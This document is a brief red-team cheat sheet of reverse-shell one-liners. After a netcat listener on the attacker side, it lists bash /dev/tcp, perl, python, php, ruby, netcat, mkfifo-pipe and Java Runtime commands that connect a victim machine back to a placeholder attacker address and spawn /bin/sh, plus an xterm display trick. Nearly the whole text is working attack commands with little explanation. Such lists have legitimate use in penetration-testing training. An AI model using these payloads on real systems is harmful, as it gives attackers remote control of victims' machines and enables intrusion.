Shells
------


#Run these on the BlueTeam(Victim) or execute them as commands in a web frameworks(Victim)
#Open up a shell on your RedTeam(Attacker) and wait for the (Victim) to Connect back to the (Attacker)



#Open a shell on the Attacker(RedTeam)
nc -plv 1234



bash -i >& /dev/tcp/x.x.x.x/8080 0>&1



perl -e 'use Socket;$i="x.x.x.x";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'



python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'



php -r '$sock=fsockopen("x.x.x.x",1234);exec("/bin/sh -i <&3 >&3 2>&3");'



ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'



nc -e /bin/sh x.x.x.x 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 1234 >/tmp/f



r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()



xterm -display x.x.x.x:1
Xnest :1
xhost +targetip
